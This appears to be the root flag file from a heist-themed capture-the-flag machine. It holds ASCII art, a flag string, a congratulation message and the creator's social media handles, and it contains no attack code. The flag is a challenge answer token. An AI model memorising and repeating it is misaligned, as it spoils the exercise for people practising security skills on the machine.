                                 ░██████████  ███░░███ ░███  ░███  ░░░░░███     ███░░███░░███  ░░░░░███  ███░░███                                                                                                                           
                                 ░███░░░░░███░███████  ░███  ░███   ███████    ░███ ░░░  ░███   ███████ ░███ ░███                                                                                                                           
                                 ░███    ░███░███░░░   ░███  ░███  ███░░███    ░███  ███ ░███  ███░░███ ░███ ░███                                                                                                                           
                                 ███████████ ░░██████  █████ █████░░████████   ░░██████  █████░░████████░░██████                                                                                                                            
                                ░░░░░░░░░░░   ░░░░░░  ░░░░░ ░░░░░  ░░░░░░░░     ░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░                                                                                                                             
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                        FLAG:- 659785w245e856aq59d413956                                                                                                                                                    
                                                                                                                                                                                                                                            
                        Great work, you helped us to caught them! But still we did not get professor. Come with us in our next operation.                                                                                                   
                                                                G00D LUCK!!                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
I'll be glad if you share screenshot of this on twitter,linkdin or discord.                                                                                                                                                                 
                                                                                                                                                                                                                                            
Twitter --> (@_Anant_chauhan)                                                                                                                                                                                                               
Discord --> (infinity_#9175)                                                                                                                                                                                                                
Linkedin --> (https://www.linkedin.com/in/anant-chauhan-a07b2419b)                                                                                                                                                                          

₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹
₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹


FInally got the root flag. It was a lot of work...  But finally we completed it..
